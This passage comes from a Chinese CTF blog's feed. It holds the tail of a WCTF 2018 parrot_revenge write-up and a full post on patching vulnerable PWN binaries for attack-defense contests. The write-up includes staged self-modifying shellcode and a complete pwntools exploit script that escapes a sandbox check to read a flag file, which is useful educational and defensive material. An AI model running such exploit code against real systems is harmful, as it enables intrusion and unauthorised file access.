0x0也就是push返回地址，并继续向下执行</span><br><span class="line">0x400742 mov r9,0x601200</span><br><span class="line">xchg rsp,r9</span><br><span class="line">shellcraft.amd64.write(1,&quot;step 1&quot;,0x6)</span><br><span class="line">shellcraft.amd64.read(0,0x400700,0x100)</span><br><span class="line">mov rax,0x400700</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>在这轮完成后，程序保存在0x40073d位置的指令从\xe8变成了\x00</p><p>我们的目标是执行syscall（\x0f\x05），因此需要在下一次执行时，将\x00变成\x0f</p><p>在一阶段的shellcode中已经构成了输入循环，因此可以再次布置二阶段的shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x400700 mov rdi,0x70         #绕过rdi的范围检查</span><br><span class="line">mov al,0x0f</span><br><span class="line">mov rcx,0x40073D</span><br><span class="line">nop nop ; padding</span><br><span class="line">0x40073D \xcc\x41\x00\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al</span><br><span class="line">0x400742 mov r9,0x601200</span><br><span class="line">xchg rsp,r9</span><br><span class="line">shellcraft.amd64.write(1,&quot;step 1&quot;,0x6)</span><br><span class="line">shellcraft.amd64.read(0,0x400700,0x100)</span><br><span class="line">mov rax,0x400700</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>这时，保存的\x00变成了\x0f，下一阶段就可以在此处调用syscall了。</p><p>由于父进程对该处的rdi有检查，execve(‘/bin/sh’,0,0)和open(‘/home/chall/flag.txt’,0)就无法调用了，此处调用openat(0x70,”/home/chall/flag.txt”,0)，这个函数第一个参数是文件夹指针，而当第二个参数是绝对路径时无视该指针，与open相同，shellcode3布置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x400700  shellcraft.amd64.openat(0x70,&quot;/home/p4nda/flag.txt&quot;,0)[:-2]</span><br><span class="line">nop nop ; padding</span><br><span class="line">0x40073D \xcc\x05\x90\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al</span><br><span class="line">0x400742 mov r9,0x601900</span><br><span class="line">xchg rsp,r9</span><br><span class="line">xchg rsp,r9</span><br><span class="line">shellcraft.amd64.read(3,0x601200,0x100)</span><br><span class="line">shellcraft.amd64.write(1,0x601200,0x100)</span><br></pre></td></tr></table></figure><p>即可读出flag，由于在本地测试，flag是我随手写的：</p><p><img src="/img/wctf2018/1-11.png" alt=""></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwnlib.util.iters import bruteforce</span></span><br><span class="line"><span class="comment"># socat TCP4-LISTEN:10001,fork EXEC:"./parent.org ./parrot_revenge"</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug :</span><br><span class="line">p = remote(<span class="string">'10.101.168.102'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.13.222'</span>,<span class="number">31337</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#p=process(['./parent','./parrot_revenge'] )</span></span><br><span class="line">elf = ELF(<span class="string">'./parrot_revenge'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'ize:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">#'4196270'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line"><span class="comment">#p.send(content)</span></span><br><span class="line"><span class="comment"># cmp 0</span></span><br><span class="line">malloc(<span class="number">0x4007AE</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment"># exit 0*3</span></span><br><span class="line">malloc(<span class="number">0x4007B9</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B8</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B7</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007A5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400789</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400762</span>,<span class="string">''</span>)</span><br><span class="line">core =  shellcraft.amd64.write(<span class="number">1</span>, <span class="string">'input:'</span>, <span class="number">0x10</span>) + shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) + <span class="string">"mov rax,0x400700\njmp rax\n"</span> <span class="comment">#+ shellcraft.amd64.openat(-3,'/home/p4nda/flag.txt', 0)#shellcraft.amd64.openat('/home/p4nda/flag.txt', 0)</span></span><br><span class="line">shellcode = asm(<span class="string">'lab1 : '</span> + core +<span class="string">'nop\n'</span> * (<span class="number">0x80</span> - len(asm(core,arch = <span class="string">'amd64'</span>))) + <span class="string">'jmp lab1'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">print</span> len(shellcode)</span><br><span class="line">malloc(<span class="number">0x150</span>, shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">malloc(<span class="number">0x400736</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set save_op 0x00</span></span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">"mov rdi,0x70\nmov r9,0x40073e\nxchg rsp,r9\n"</span><span class="comment"># +shellcraft.amd64.read(0,0x400700,0x100)</span></span><br><span class="line">asm_shellcode1 = asm(shellcode1,arch=<span class="string">'amd64'</span>)</span><br><span class="line">asm_shellcode1 = asm_shellcode1.ljust(<span class="number">0x40073D</span><span class="number">-0x400700</span>,<span class="string">'\x90'</span>)</span><br><span class="line">asm_shellcode1 += <span class="string">"\xcc\x00\x00\x00\x00"</span></span><br><span class="line">shellcode1 = <span class="string">"mov r9,0x601200\nxchg rsp,r9\n"</span>+  shellcraft.amd64.write(<span class="number">1</span>,<span class="string">"step 1"</span>,<span class="number">0x6</span>) +  shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) +<span class="string">"mov rax,0x400700\njmp rax\n"</span></span><br><span class="line">asm_shellcode1 += asm(shellcode1,arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input:'</span>)</span><br><span class="line">p.send(asm_shellcode1)</span><br><span class="line"><span class="comment"># set save_op 0xf0</span></span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">"mov rdi,0x70\nmov al,0x0f\nmov rcx,0x40073D\n"</span></span><br><span class="line">asm_shellcode2 = asm(shellcode2,arch=<span class="string">'amd64'</span>)</span><br><span class="line">asm_shellcode2 = asm_shellcode2.ljust(<span class="number">0x40073D</span><span class="number">-0x400700</span>,<span class="string">'\x90'</span>)</span><br><span class="line">asm_shellcode2 += <span class="string">"\xcc\x41\x00\x90\x90"</span></span><br><span class="line">shellcode2 = <span class="string">"mov r9,0x601200\nxchg rsp,r9\n"</span>+  shellcraft.amd64.write(<span class="number">1</span>,<span class="string">"step 2"</span>,<span class="number">0x6</span>) +  shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) +<span class="string">"mov rax,0x400700\njmp rax\n"</span></span><br><span class="line">asm_shellcode2 += asm(shellcode2,arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'step 1'</span>)</span><br><span class="line">p.send(asm_shellcode2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#openat(0x70,"flag.txt",0)</span></span><br><span class="line">shellcode3 = shellcraft.amd64.openat(<span class="number">0x70</span>,<span class="string">"/home/p4nda/flag.txt"</span>,<span class="number">0</span>)</span><br><span class="line">asm_shellcode3 = asm(shellcode3,arch=<span class="string">'amd64'</span>)[:<span class="number">-2</span>]</span><br><span class="line">asm_shellcode3 = asm_shellcode3.ljust(<span class="number">0x40073D</span><span class="number">-0x400700</span>,<span class="string">'\x90'</span>)</span><br><span class="line">asm_shellcode3 += <span class="string">"\xcc\x05\x90\x90\x90"</span></span><br><span class="line">shellcode3 = <span class="string">"mov r9,0x601900\nxchg rsp,r9\n"</span> +shellcraft.amd64.read(<span class="number">3</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)+  shellcraft.amd64.write(<span class="number">1</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)  <span class="comment">#+ shellcraft.amd64.write(1,0x601200,0x100)</span></span><br><span class="line">asm_shellcode3+= asm(shellcode3,arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'step 2'</span>)</span><br><span class="line">p.send(asm_shellcode3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em>TokyoWestern</em>s的ppt</p><p><img src="/img/wctf2018/ppt1.jpg" alt=""></p><p><img src="/img/wctf2018/ppt2.jpg" alt=""></p><p><img src="/img/wctf2018/ppt3.jpg" alt=""></p><p><img src="/img/wctf2018/ppt4.jpg" alt=""></p><p><img src="/img/wctf2018/ppt5.jpg" alt=""></p><p><img src="/img/wctf2018/ppt6.jpg" alt=""></p><p><img src="/img/wctf2018/ppt7.jpg" alt=""></p><p><img src="/img/wctf2018/ppt8.jpg" alt=""></p><p><img src="/img/wctf2018/ppt9.jpg" alt=""></p><p><img src="/img/wctf2018/ppt10.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      参加了WCTF 2018的新锐赛，比赛中队伍共解出3道题目，parrot_revenge题目做到了执行shellcode，但是困在沙箱里面出不来了，本地环境也没搭起来，赛后和vulcan team的大佬交流一下也没有解决问题... 最后听了TokyoWesterns的分享，在赛后复现了这道题。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下赛中常用的PWN题patch方法</title>
    <link href="http://p4nda.top/2018/07/02/patch-in-pwn/"/>
    <id>http://p4nda.top/2018/07/02/patch-in-pwn/</id>
    <published>2018-07-02T11:26:13.000Z</published>
    <updated>2018-07-28T03:54:38.952Z</updated>
    
    <content type="html"><![CDATA[<p>在国赛以后，突然发现对PWN题中的patch方法了解不太深入，尤其是不够优雅，经常就用IDA直接手改了，或者就是用加一个section的方法，导致patch后的文件改动很大，尤其是在国赛中，被主办方打电话过来问是不是加了通防，本文就简单介绍一下常用的patch方法。</p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>IDA Pro是一个非常强大的工具，其中包含了对汇编指令修改的功能。</p><p>以国赛华北赛区的半决赛为例，其中有一道PWN2是一个栈溢出，代码是这样的。</p><p><img src="/img/patch-in-pwn/1-1.png" alt=""></p><p>很显然，在read这里有一个明显的栈溢出，修复漏洞的方法也和容易，将这个值改小成0x138就好了，下面的write也一样的改法。</p><p>这里使用IDA默认的修改插件来改，在Edit-Patch Program目录下，首先切换到IDA View-A这个汇编指令界面，并选中要改的汇编指令行:</p><p><img src="/img/patch-in-pwn/1-2.png" alt=""></p><p>选择Assemble/Change byte/Change word都可以，以Assemble为例在Instruction窗口，将mov     edx, 1cch改为mov     edx, 138h。</p><p>此时，切换到类C语言窗口可以看到该行已经被修改为了read(a1, &amp;s, 0x138uLL);</p><p><img src="/img/patch-in-pwn/1-3.png" alt=""></p><p>但并没有完，这仅仅修改了IDA对于该文件的数据库，并没有应用到文件中去，同样在Edit-Patch Program目录下，选择Apply patches into file…，将修改写入文件，就完成了一道简单题目的patch。</p><p><img src="/img/patch-in-pwn/1-3.png" alt=""></p><p>这种方法完全依靠手动，而且不能修改文件结构，可以供手动修改的位置也很少，一旦出现如UAF等悬垂指针的问题基本就很难解决了，还得依靠其他更有力的方法来解决。</p><h1 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h1><p>lief是一个开源的跨平台的可执行文件修改工具，链接如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lief-project/LIEF</span><br></pre></td></tr></table></figure><p>对外提供了Python、C++、C的接口。</p><p>对于Python库安装可以使用pip，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install lief</span><br></pre></td></tr></table></figure><p>对于lief的API和用法就不介绍了，RTFM。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lief.quarkslab.com/doc/latest/api/python/index.html</span><br></pre></td></tr></table></figure><p>以下是几种可行的patch方法</p><h2 id="增加segment"><a href="#增加segment" class="headerlink" title="增加segment"></a>增加segment</h2><p>这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。</p><p>首先我们的代码程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"/bin/sh%d"</span>,<span class="number">102</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"let's go\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"/bin/sh%d"</span>,<span class="number">102</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"let's gogo\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想把第一处printf修改掉，改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> *a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"mov %rdi,%rsi\n"</span></span><br><span class="line"><span class="string">"mov $0,%rdi\n"</span></span><br><span class="line"><span class="string">"mov $0x20,%rdx\n"</span></span><br><span class="line"><span class="string">"mov $0x1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myputs</span><span class="params">(<span class="keyword">char</span> *a)</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"push $0x41414141\n"</span></span><br><span class="line"><span class="string">"push $0x42424242\n"</span></span><br><span class="line"><span class="string">"push %rsp\n"</span></span><br><span class="line"><span class="string">"pop  %rsi\n"</span></span><br><span class="line"><span class="string">"mov $0,%rdi\n"</span></span><br><span class="line"><span class="string">"mov $0x20,%rdx\n"</span></span><br><span class="line"><span class="string">"mov $0x1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"pop %rax\n"</span></span><br><span class="line"><span class="string">"pop %rax\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span></span><br></pre></td></tr></table></figure><p>如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。</p><p>patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。</p><p>lief中提供了add参数可以用于为二进制文件增加段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binary    = lief.parse(binary_name)</span><br><span class="line">lib  = lief.parse(lib_name)</span><br><span class="line">segment_add = binary.add(lib.segments[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr</p><p>因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call xxx  =(addr of new segment + offset function ) -  (addr of order + 5 /*length of call xx*/)</span><br></pre></td></tr></table></figure><p>由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch计算函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_call</span><span class="params">(file,where,end,arch = <span class="string">"amd64"</span>)</span>:</span></span><br><span class="line"><span class="keyword">print</span> hex(end)</span><br><span class="line"></span><br><span class="line">length = p32((end - (where + <span class="number">5</span> )) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">order = <span class="string">'\xe8'</span>+length</span><br><span class="line"><span class="keyword">print</span> disasm(order,arch=arch)</span><br><span class="line">file.patch_address(where,[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> order])</span><br></pre></td></tr></table></figure><p>执行之后可以看到patch成功了，</p><p><img src="/img/patch-in-pwn/1-5.png" alt=""></p><p><img src="/img/patch-in-pwn/1-6.png" alt=""></p><p>但是一个重大的问题是patch前后文件大小改动很大：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/patch] - [一 7月 02, 20:36]</span><br><span class="line">└─[$] &lt;&gt; python 1.py</span><br><span class="line">0x8022f9</span><br><span class="line">   0:   e8 70 1d 40 00          call   0x401d75</span><br><span class="line">[+] ori size 8656</span><br><span class="line">[+] patch size 15885</span><br><span class="line">[+] Seccessful patched <span class="keyword">in</span> adding segment</span><br></pre></td></tr></table></figure><p>这样在一些线下赛中很容易由于修改过大和被判定为通防或者宕机。</p><h2 id="增加library"><a href="#增加library" class="headerlink" title="增加library"></a>增加library</h2><p>这是借鉴LD_preload的一种思路，当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。如下例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"/bin/sh%d"</span>, <span class="number">102L</span>L, envp, argv);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一个动态链接库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#include "/home/p4nda/linux-4.17.3/lib/syscall.c"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="comment">//#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="comment">// gcc -nostdlib  -nodefaultlibs -fPIC -Wl,-shared patch.c -o patch -ldl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *a,<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[] = <span class="string">"hacked by me\n "</span>;</span><br><span class="line"><span class="comment">//puts(a);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(a,<span class="string">"/bin/sh"</span>))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"find dangerous str~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> (*old_printf)(<span class="keyword">char</span> *,<span class="keyword">int</span>);</span><br><span class="line">old_printf =(<span class="keyword">int</span> (*)(<span class="keyword">char</span> *,<span class="keyword">int</span>)) dlsym(RTLD_NEXT, <span class="string">"printf"</span>);</span><br><span class="line">old_printf(a,b); </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令在注释中，则每次printf时都会先执行上述库中的函数，达到hook的目的。</p><p><img src="/img/patch-in-pwn/1-7.png" alt=""></p><p>优势很明显，可以执行任意libc内函数代码，让编程更容易。</p><p>不过缺点也很明显，首先程序变得<strong>巨大</strong>，并且当不存在这个静态链接库的时候，程序跑不起来… 有些线下赛都是本地check的，比如*网杯，很容易就判断宕机了…</p><p><img src="/img/patch-in-pwn/1-8.png" alt=""></p><h2 id="修改程序-eh-frame段"><a href="#修改程序-eh-frame段" class="headerlink" title="修改程序.eh_frame段"></a>修改程序.eh_frame段</h2><p>在TSCTF 2018 Final时，我在NeSE战队的binary文件中找到了通防工具，但是程序改动并没有特别大，当时感觉很好奇，在赛后调试了一下，发现他们把通防的shellcode写在了一个叫.eh_frame的段中，这个段会加载到程序中来，并且自身带有可执行权限，在查找这个段用处时，发现该段对程序执行影响不大，故可以将patch代码写在这个段中，再用跳转的方法将程序逻辑劫持到这里来。</p><p><img src="/img/patch-in-pwn/1-10.png" alt=""></p><p><img src="/img/patch-in-pwn/1-11.png" alt=""></p><p>可以看到在patch前后，程序大小保持不变。</p><p><img src="/img/patch-in-pwn/1-9.png" alt=""></p><p>缺点同样明显，.eh_frame的大小是有限的…</p><p>综上，似乎没有比较简洁的通用方法，综合着来用吧….</p>]]></content>
    
    <summary type="html">
    
      在国赛以后，突然发现对PWN题中的patch方法了解不太深入，尤其是不够优雅，经常就用IDA直接手改了，或者就是用加一个section的方法，导致patch后的文件改动很大，尤其是在国赛中，被主办方打电话过来问是不是加了通防，本文就简单介绍一下常用的patch方法。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PWNABLE.TW】 wannaheap 解题思路</title>
    <link href="http://p4nda.top/2018/06/28/pwnable-tw-wannaheap/"/>
    <id>http://p4nda.top/2018/06/28/pwnable-tw-wannaheap/</id>
    <published>2018-06-28T03:11:52.000Z</published>
    <updated>2018-07-01T15:41:49.540Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="security">  <div class="input-container">  <input type="password" class="form-control" id="pass" placeholder="Enter password to read." />    <label for="pass">Enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" 